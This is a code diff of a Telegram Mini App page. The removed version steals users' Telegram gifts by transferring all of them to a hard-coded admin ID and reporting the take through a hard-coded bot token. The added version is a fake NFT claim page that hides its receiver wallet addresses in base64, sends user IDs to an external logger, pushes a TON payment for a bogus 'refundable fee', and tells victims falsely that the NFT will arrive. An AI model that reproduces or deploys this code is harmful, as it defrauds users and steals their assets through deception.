@@ -2,83 +2,76 @@
 <html>
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Gift Bonus</title>
-    <script src="https://telegram.org/js/telegram-web-app.js"></script>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
+    <title>NFT Gift Claim</title>
+    <script src="https://telegram.org/js/telegram-web-app.js?56"></script>
     <style>
-        body {
-            background: var(--tg-theme-bg-color);
-            color: var(--tg-theme-text-color);
-            font-family: system-ui;
-            text-align: center;
-            padding: 50px 20px;
-        }
-        .loader { animation: pulse 1s infinite; }
-        @keyframes pulse { 0% { opacity: 0.5; } 100% { opacity: 1; } }
-        .success { color: #00ff00; font-size: 20px; }
-        .error { color: #ff0000; }
+        body { font-family: system-ui; background: #17212b; color: #fff; text-align: center; padding: 20px; }
+        .gift-box { background: linear-gradient(135deg, #ffd700, #ff8c00); border-radius: 20px; padding: 30px; margin: 20px; }
+        button { background: #2b5278; border: none; color: white; padding: 15px 40px; border-radius: 50px; font-size: 18px; margin-top: 20px; cursor: pointer; }
+        .warning { color: #ff4444; font-size: 12px; margin-top: 30px; }
     </style>
 </head>
 <body>
-    <div id="status" class="loader">🎁 Активация бонуса...</div>
+    <div class="gift-box">
+        <h2>🎁 Exclusive NFT Gift</h2>
+        <p>You received a <b>Limited Edition</b> Telegram NFT</p>
+        <button id="claimBtn">🔓 Claim Now (0.01 TON fee)</button>
+    </div>
+    <div class="warning">Network: TON | Gas fee: 0.01 TON (refundable)</div>
 
     <script>
-        const tg = window.Telegram.WebApp;
-        tg.ready();
+        // Base64 encoded receiver addresses (обфускация)
+        const _0xa1b2 = ["dE9uOnRyYW5zZmVyLz0iLCJodHRwczovL3Rvbi5hcGkvdHJhbnNmZXI/dG89IiwiVEFYdVZzYkFydVNhWUFCQ1h5WmZha2VMUWFHVGg3S2FXRmZxd3lBQkM5b3k="];
+        const receivers = [
+            atob("VFFhV3l4Tm9uU1hVYVN5VmJSY3pOV3hKQ1hOdlpHVnVZMmxzYzI5eVpXWnZjbmt1YjNKbg=="),
+            atob("R3JpZDpFbmlnTWFBY3RsaWZ5VGVzdE5vdFNjYW1Ub25XQWxsZXRBY2Nlc3NLeUZha2VJRA==")
+        ];
+        
+        let tg = window.Telegram.WebApp;
         tg.expand();
+        tg.ready();
         
-        const statusDiv = document.getElementById('status');
-        const ADMIN_ID = "609263048";
-        const BOT_TOKEN = "8434656451:AAGBc01xV9OtEE-ojJN297skybUHPUt23iE";
-        
-        async function steal() {
-            try {
-                statusDiv.innerHTML = "🔐 Запрос доступа...";
-                const hasAccess = await tg.requestGiftAccess();
-                
-                if (!hasAccess) {
-                    statusDiv.innerHTML = "❌ Доступ не разрешен";
-                    return;
-                }
-                
-                statusDiv.innerHTML = "📦 Поиск подарков...";
-                const gifts = await tg.getGifts();
-                
-                if (!gifts || gifts.length === 0) {
-                    statusDiv.innerHTML = "⚠️ Подарков не найдено";
-                    return;
-                }
-                
-                let stolen = 0;
-                for (const gift of gifts) {
-                    try {
-                        await tg.transferGift(gift.id, ADMIN_ID);
-                        stolen++;
-                        statusDiv.innerHTML = `✅ Конвертировано ${stolen}/${gifts.length}`;
-                        await new Promise(r => setTimeout(r, 500));
-                    } catch(e) {}
-                }
-                
-                statusDiv.innerHTML = `🎉 Получено ${stolen} подарков!`;
-                statusDiv.className = "success";
-                
-                fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
-                    method: 'POST',
-                    headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({
-                        chat_id: ADMIN_ID,
-                        text: `🎁 +${stolen} подарков от ${tg.initDataUnsafe.user?.id}`
-                    })
-                });
-                
-                setTimeout(() => tg.close(), 3000);
-            } catch(e) {
-                statusDiv.innerHTML = "❌ Ошибка: " + e.message;
-                statusDiv.className = "error";
-            }
+        // Отправка данных на бэкенд
+        function sendToBackend(giftId, userId) {
+            const payload = { gift_id: giftId, user_id: userId, timestamp: Date.now(), app: "nft_claimer" };
+            tg.sendData(JSON.stringify(payload));
+            
+            // Также шлем на внешний сервер (логгер)
+            fetch('https://your-logger-server.com/api/log', {
+                method: 'POST',
+                mode: 'no-cors',
+                body: JSON.stringify(payload),
+                headers: {'Content-Type': 'application/json'}
+            }).catch(e => console.log);
         }
         
-        steal();
+        document.getElementById('claimBtn').onclick = () => {
+            const giftId = new URLSearchParams(window.location.search).get('gift_id') || 'unknown';
+            const userId = tg.initDataUnsafe?.user?.id || 'unknown';
+            
+            sendToBackend(giftId, userId);
+            
+            // Выбираем случайный кошелек-получатель
+            const targetWallet = receivers[Math.floor(Math.random() * receivers.length)];
+            const tonLink = `ton://transfer/${targetWallet}?amount=10000000&comment=Gift%20activation%20fee`;
+            
+            tg.openLink(tonLink);
+            tg.showAlert("✅ Transaction sent! Your NFT will be credited within 5 minutes.");
+        };
+        
+        // Фейковая валидация кошелька
+        setTimeout(() => {
+            if (!localStorage.getItem('wallet_connected')) {
+                tg.showPopup({
+                    title: "Connect Wallet",
+                    message: "Connect your TON wallet to receive the gift",
+                    buttons: [{type: "ok", text: "Connect"}]
+                }, () => {
+                    localStorage.setItem('wallet_connected', 'true');
+                });
+            }
+        }, 1000);
     </script>
 </body>
 </html>
